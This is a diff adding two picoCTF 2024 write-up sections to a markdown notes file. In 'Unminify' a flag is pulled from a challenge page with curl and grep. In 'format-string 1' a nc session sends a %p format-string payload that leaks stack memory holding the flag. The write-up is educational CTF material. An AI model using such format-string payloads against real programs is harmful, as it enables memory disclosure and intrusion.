@@ -527,3 +527,28 @@ int main() {
 ```
 
 and now you can find the half ouput.
+
+## Unminify.md
+
+The flag is visible in the class attributs of the code. Or simply can curl through
+```bash
+[eyun@eax ~]$ history | curl -s http://titan.picoctf.net:63495/ | grep -oE picoCTF{.*} --color=none | cut -d "\"" -f1
+picoCTF{pr3tty_c0d3_ed938a7e}
+```
+
+## formant-string 1
+
+the use of ```printf(buf);``` can lead to a format string vulnerability, where an attacker can exploit this to execute arbitrary code or read from the stack.
+were gonna use %p payload to reveal the memory address from the stack , can refer [here](https://ir0nstone.git book.io/notes/types/stack/format-string)
+
+```bash
+[eyun@eax ~]$ nc mimas.picoctf.net 53103
+Give me your order and I'll read it back to you:
+%14$p.%15$p.%16$p.%17$p.%18$p.%22$p.%23$p 
+Here's your order: 0x7b4654436f636970.0x355f31346d316e34.0x3478345f33317937.0x35625f673431665f.0x7d663839623764.0x206e693374307250.0xa336c797453
+Bye!
+```
+
+Then reorder the hex according to LIFO order.
+[ref 1](https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/Binary%20Explotation/format-string-1.md) , [ref 2](https://medium.com/@mastercode112/picoctf-2024-writeup-by-mastercode-d9eae91698a1)
+
